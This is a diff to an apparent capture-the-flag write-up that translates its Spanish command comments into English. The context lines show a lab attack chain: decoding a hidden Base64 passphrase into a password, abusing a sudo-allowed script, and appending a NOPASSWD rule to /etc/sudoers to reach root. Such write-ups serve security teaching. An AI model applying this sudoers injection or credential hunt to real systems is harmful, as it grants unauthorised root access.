@@ -148,7 +148,7 @@ find / -type f -executable -user deku 2>/dev/null
 Hidden directory from `cd /`:
 ```bash
 # What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# Why here: check files, permissions or loot in the current path.
 ls /
 # ... Hidden_Content ...
 # What it does: displays a file in the terminal.
@@ -156,7 +156,7 @@ ls /
 cat /Hidden_Content/passphrase.txt
 # QWxsbWlnaHRGb3JFdmVyISEh
 # What it does: decodes or encodes Base64 data.
-# Why here: convertir loot codificado en texto utilizable.
+# Why here: convert encoded loot into usable plaintext.
 echo 'QWxsbWlnaHRGb3JFdmVyISEh' | base64 -d
 # AllmightForEver!!!
 ```
@@ -216,7 +216,7 @@ Full technique: [bash-eval-filter-bypass.md](../../../privesc/linux/bash-eval-fi
 
 ```bash
 # What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# Why here: find allowed commands that can be abused for privilege escalation.
 sudo -l
 # (ALL) /opt/NewComponent/feedback.sh
 # What it does: displays a file in the terminal.
@@ -248,7 +248,7 @@ deku ALL=NOPASSWD: ALL >> /etc/sudoers
 
 ```bash
 # What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# Why here: confirm the sudoers bypass granted unrestricted sudo access.
 sudo -l              # deku may now run anything
 sudo su -
 ```
